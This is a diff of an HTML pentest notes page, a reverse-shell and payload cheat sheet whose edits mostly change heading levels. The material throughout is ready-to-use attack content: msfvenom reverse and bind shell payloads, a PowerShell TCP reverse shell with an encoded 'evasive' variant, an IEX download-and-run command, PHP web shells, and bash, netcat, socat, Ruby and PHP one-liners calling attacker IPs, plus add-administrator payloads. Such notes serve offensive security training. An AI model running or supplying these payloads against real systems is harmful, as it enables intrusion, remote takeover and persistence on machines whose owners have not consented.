@@ -173,19 +173,14 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="go-to"><a class="header" href="#go-to"><ins>Go To</ins></a></h2>
+                        <h2 id="shells"><a class="header" href="#shells">Shells</a></h2>
+<h3 id="go-to"><a class="header" href="#go-to"><ins>Go To</ins></a></h3>
 <ul>
-<li>
-<p><a href="https://www.revshells.com/">Reverse Shell Generator</a></p>
-</li>
-<li>
-<p><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PenTestMonkey</a></p>
-</li>
-<li>
-<p><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/">Payloads All The Things</a></p>
-</li>
+<li><a href="https://www.revshells.com/">Reverse Shell Generator</a></li>
+<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PenTestMonkey</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/">Payloads All The Things</a></li>
 </ul>
-<h2 id="quick-note"><a class="header" href="#quick-note">Quick Note</a></h2>
+<h3 id="quick-note"><a class="header" href="#quick-note"><ins>Quick Note</ins></a></h3>
 <pre><code>
 Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.
 
@@ -207,13 +202,13 @@ export TERM=xterm-256color
 stty rows &lt;num&gt; columns &lt;cols&gt;
 
 </code></pre>
-<h2 id="web-shells"><a class="header" href="#web-shells"><ins>WEB SHELLS</ins></a></h2>
+<h3 id="web-shells"><a class="header" href="#web-shells"><ins>WEB SHELLS</ins></a></h3>
 <p><strong>/usr/share/webshells</strong></p>
 <p><strong>MSFvenom Format:-</strong></p>
 <p><code>msfvenom -p &lt;PAYLOAD&gt; -e &lt;ENCODER&gt; -f &lt;FORMAT&gt; -i &lt;ENCODE COUNT&gt; LHOST=&lt;IP&gt;</code></p>
 <p>One can also use the <code>-a</code> to specify the architecture or the <code>--platform</code></p>
-<h2 id="windows"><a class="header" href="#windows"><ins>WINDOWS</ins></a></h2>
-<h3 id="reverse-shell"><a class="header" href="#reverse-shell"><strong>Reverse Shell</strong></a></h3>
+<h3 id="windows"><a class="header" href="#windows"><ins>WINDOWS</ins></a></h3>
+<h4 id="reverse-shell"><a class="header" href="#reverse-shell"><strong>Reverse Shell</strong></a></h4>
 <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
 
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
@@ -224,27 +219,27 @@ msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
 </code></pre>
-<h3 id="bind-shell"><a class="header" href="#bind-shell">Bind Shell[]</a></h3>
+<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind Shell</a></h4>
 <pre><code>msfvenom -p windows/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; bind.exe
 </code></pre>
-<h3 id="create-user"><a class="header" href="#create-user">Create User</a></h3>
+<h4 id="create-user"><a class="header" href="#create-user">Create User</a></h4>
 <pre><code>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe &gt; adduser.exe
 </code></pre>
-<h3 id="cmd-shell"><a class="header" href="#cmd-shell">CMD Shell</a></h3>
+<h4 id="cmd-shell"><a class="header" href="#cmd-shell">CMD Shell</a></h4>
 <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; prompt.exe
 </code></pre>
-<h3 id="execute-command"><a class="header" href="#execute-command"><strong>Execute Command</strong></a></h3>
+<h4 id="execute-command"><a class="header" href="#execute-command"><strong>Execute Command</strong></a></h4>
 <pre><code>msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe &gt; pay.exe
 
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe &gt; pay.exe
 </code></pre>
-<h3 id="encoder"><a class="header" href="#encoder">Encoder</a></h3>
+<h4 id="encoder"><a class="header" href="#encoder">Encoder</a></h4>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe
 </code></pre>
-<h3 id="embedded-inside-executable"><a class="header" href="#embedded-inside-executable">Embedded inside executable</a></h3>
+<h4 id="embedded-inside-executable"><a class="header" href="#embedded-inside-executable">Embedded inside executable</a></h4>
 <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 </code></pre>
-<h3 id="powershell"><a class="header" href="#powershell">Powershell</a></h3>
+<h4 id="powershell"><a class="header" href="#powershell">Powershell</a></h4>
 <pre><code>$client = New-Object System.Net.Sockets.TCPClient('192.168.45.225',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 Apparently this is a more evasive way of doing it:
@@ -272,7 +267,7 @@ $MyBase64
 
 
 </code></pre>
-<h3 id="python-to-encode-powershell-reverse-shell"><a class="header" href="#python-to-encode-powershell-reverse-shell">Python to encode Powershell Reverse Shell</a></h3>
+<h4 id="python-to-encode-powershell-reverse-shell"><a class="header" href="#python-to-encode-powershell-reverse-shell">Python to encode Powershell Reverse Shell</a></h4>
 <pre><code>Quick Python Powershell Reverse Shell generator
 ---
 
@@ -286,8 +281,8 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 
 </code></pre>
-<h2 id="linux"><a class="header" href="#linux"><ins>LINUX</ins></a></h2>
-<h3 id="reverse-shell-1"><a class="header" href="#reverse-shell-1"><strong>Reverse Shell</strong></a></h3>
+<h3 id="linux"><a class="header" href="#linux"><ins>LINUX</ins></a></h3>
+<h4 id="reverse-shell-1"><a class="header" href="#reverse-shell-1"><strong>Reverse Shell</strong></a></h4>
 <pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
@@ -296,15 +291,15 @@ msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f e
 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
 </code></pre>
-<h3 id="bind-shell-1"><a class="header" href="#bind-shell-1">Bind Shell</a></h3>
+<h4 id="bind-shell-1"><a class="header" href="#bind-shell-1">Bind Shell</a></h4>
 <pre><code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; bind.elf
 </code></pre>
-<h3 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h3>
+<h4 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h4>
 <pre><code>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -e x86/shikata_ga_nai -b '\x00' &gt; solshell.elf
 </code></pre>
-<h2 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h2>
-<h3 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h3>
-<h4 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h4>
+<h3 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h3>
+<h4 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h4>
+<h5 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h5>
 <pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
 
 cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
@@ -320,31 +315,31 @@ system('nc.exe -e cmd.exe 10.10.10.5 4444')
 </code></pre>
 <pre><code>&lt;?php system($_REQUEST["cmd"]); ?&gt;
 </code></pre>
-<h3 id="aspx"><a class="header" href="#aspx">ASP/x</a></h3>
-<h4 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h4>
+<h4 id="aspx"><a class="header" href="#aspx">ASP/x</a></h4>
+<h5 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h5>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp &gt;reverse.asp
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx &gt;reverse.aspx
 </code></pre>
-<h3 id="jsp"><a class="header" href="#jsp">JSP</a></h3>
-<h4 id="reverse-shell-4"><a class="header" href="#reverse-shell-4">Reverse shell</a></h4>
+<h4 id="jsp"><a class="header" href="#jsp">JSP</a></h4>
+<h5 id="reverse-shell-4"><a class="header" href="#reverse-shell-4">Reverse shell</a></h5>
 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw&gt; reverse.jsp
 </code></pre>
-<h3 id="war"><a class="header" href="#war">WAR</a></h3>
-<h4 id="reverse-shell-5"><a class="header" href="#reverse-shell-5">Reverse Shell</a></h4>
+<h4 id="war"><a class="header" href="#war">WAR</a></h4>
+<h5 id="reverse-shell-5"><a class="header" href="#reverse-shell-5">Reverse Shell</a></h5>
 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war
 </code></pre>
-<h3 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h3>
+<h4 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h4>
 <pre><code>msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 </code></pre>
-<h2 id="script-language-payloads"><a class="header" href="#script-language-payloads"><strong>Script Language payloads</strong></a></h2>
-<h3 id="perl"><a class="header" href="#perl"><strong>Perl</strong></a></h3>
+<h3 id="script-language-payloads"><a class="header" href="#script-language-payloads"><strong>Script Language payloads</strong></a></h3>
+<h4 id="perl"><a class="header" href="#perl"><strong>Perl</strong></a></h4>
 <pre><code>msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.pl
 </code></pre>
-<h3 id="python"><a class="header" href="#python"><strong>Python</strong></a></h3>
+<h4 id="python"><a class="header" href="#python"><strong>Python</strong></a></h4>
 <pre><code>msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.py
 </code></pre>
-<h3 id="php-1"><a class="header" href="#php-1">PHP</a></h3>
+<h4 id="php-1"><a class="header" href="#php-1">PHP</a></h4>
 <pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
 </code></pre>
 <pre><code>&lt;?php
@@ -355,7 +350,7 @@ system('nc.exe -e cmd.exe 10.10.14.13 4444')
 
 &lt;?php system($_REQUEST["cmd"]); ?&gt;
 </code></pre>
-<h3 id="bash"><a class="header" href="#bash">BASH</a></h3>
+<h4 id="bash"><a class="header" href="#bash">BASH</a></h4>
 <pre><code>bash -i &gt;&amp; /dev/tcp//9999 0&gt;&amp;1
 
 Base One-liner for URL RCE + Encoded
@@ -364,17 +359,17 @@ Base One-liner for URL RCE + Encoded
 curl -k http://192.168.220.52/cmsms/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.225%2F4444%200%3E%261%22
 
 </code></pre>
-<h3 id="ruby"><a class="header" href="#ruby">RUBY</a></h3>
+<h4 id="ruby"><a class="header" href="#ruby">RUBY</a></h4>
 <pre><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
 </code></pre>
-<h3 id="netcat"><a class="header" href="#netcat">NETCAT</a></h3>
+<h4 id="netcat"><a class="header" href="#netcat">NETCAT</a></h4>
 <pre><code>nc -e /bin/sh 10.0.0.5 1234
 </code></pre>
 <pre><code>#OpenBSD netcat doesn't support -e flag. You can even try BASH 1-liner
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
 </code></pre>
-<h3 id="adduserc"><a class="header" href="#adduserc">Adduser.c</a></h3>
+<h4 id="adduserc"><a class="header" href="#adduserc">Adduser.c</a></h4>
 <p>On the Attacking machine compile it first: <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe, then transfer it to Victim</code></p>
 <pre><code># ADDUSER.C
 
@@ -394,7 +389,7 @@ return 0;
 
 }
 </code></pre>
-<h3 id="socat"><a class="header" href="#socat">Socat</a></h3>
+<h4 id="socat"><a class="header" href="#socat">Socat</a></h4>
 <pre><code>#Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
@@ -403,7 +398,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 or Socat Command Injection one liner:
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 </code></pre>
-<h2 id="tty-shells"><a class="header" href="#tty-shells"><ins>TTY Shells</ins></a></h2>
+<h3 id="tty-shells"><a class="header" href="#tty-shells"><ins>TTY Shells</ins></a></h3>
 <p>Spawn shells</p>
 <ul>
 <li>Python: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code></li>
